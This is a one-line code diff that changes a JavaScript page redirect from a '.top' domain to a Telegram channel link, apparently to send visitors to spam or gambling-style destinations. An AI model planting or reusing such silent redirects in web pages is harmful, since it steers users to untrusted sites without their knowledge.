@@ -1,1 +1,1 @@
-window.location.href = "https://ccc6568.top/";
+window.location.href = "https://t.me/facai66iii";
